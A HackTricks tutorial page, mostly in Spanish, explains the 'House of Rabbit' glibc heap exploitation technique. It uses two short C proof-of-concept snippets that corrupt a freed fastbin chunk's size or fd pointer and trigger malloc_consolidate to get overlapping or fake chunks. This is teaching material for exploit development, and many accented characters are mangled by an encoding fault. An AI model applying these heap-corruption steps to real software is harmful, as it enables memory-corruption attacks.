# House of Rabbit

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

### Requirements

1. **Capacidad para modificar el puntero fd de fast bin o su tama침o**: Esto significa que puedes cambiar el puntero hacia adelante de un chunk en el fastbin o su tama침o.
2. **Capacidad para activar `malloc_consolidate`**: Esto se puede hacer al asignar un chunk grande o fusionar el chunk superior, lo que obliga al heap a consolidar chunks.

### Goals

1. **Crear chunks superpuestos**: Para que un chunk se superponga con otro, permitiendo m치s manipulaciones del heap.
2. **Forjar chunks falsos**: Para enga침ar al asignador haci칠ndole tratar un chunk falso como un chunk leg칤timo durante las operaciones del heap.

## Steps of the attack

### POC 1: Modificar el tama침o de un chunk de fast bin

**Objetivo**: Crear un chunk superpuesto manipulando el tama침o de un chunk de fastbin.

* **Paso 1: Asignar Chunks**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
We allocate two chunks of 0x40 bytes each. These chunks will be placed in the fast bin list once freed.

* **Paso 2: Liberar Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
We free both chunks, adding them to the fastbin list.

* **Paso 3: Modificar el tama침o del chunk**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
Cambiamos los metadatos de tama침o de `chunk1` a 0xa1. Este es un paso crucial para enga침ar al asignador durante la consolidaci칩n.

* **Paso 4: Activar `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Asignar un gran bloque activa la funci칩n `malloc_consolidate`, fusionando peque침os bloques en el fast bin. El tama침o manipulado de `chunk1` hace que se superponga con `chunk2`.

Despu칠s de la consolidaci칩n, `chunk1` se superpone con `chunk2`, lo que permite una mayor explotaci칩n.

### POC 2: Modificar el puntero `fd`

**Objetivo**: Crear un bloque falso manipulando el puntero `fd` del fast bin.

* **Paso 1: Asignar Bloques**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Explicaci칩n**: Asignamos dos trozos, uno m치s peque침o y uno m치s grande, para preparar el heap para el trozo falso.

* **Paso 2: Crear trozo falso**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
Escribimos metadatos de chunk falsos en `chunk2` para simular chunks m치s peque침os.

* **Paso 3: Liberar `chunk1`**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Explicaci칩n**: Liberamos `chunk1`, a침adi칠ndolo a la lista fastbin.

* **Paso 4: Modificar `fd` de `chunk1`**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Explicaci칩n**: Cambiamos el puntero hacia adelante (`fd`) de `chunk1` para que apunte a nuestro chunk falso dentro de `chunk2`.

* **Paso 5: Activar `malloc_consolidate`**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Asignar un gran bloque nuevamente activa `malloc_consolidate`, que procesa el bloque falso.

El bloque falso se convierte en parte de la lista fastbin, haci칠ndolo un bloque leg칤timo para una mayor explotaci칩n.

### Resumen

La t칠cnica **House of Rabbit** implica modificar el tama침o de un bloque fast bin para crear bloques superpuestos o manipular el puntero `fd` para crear bloques falsos. Esto permite a los atacantes forjar bloques leg칤timos en el heap, habilitando varias formas de explotaci칩n. Comprender y practicar estos pasos mejorar치 tus habilidades de explotaci칩n de heap.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
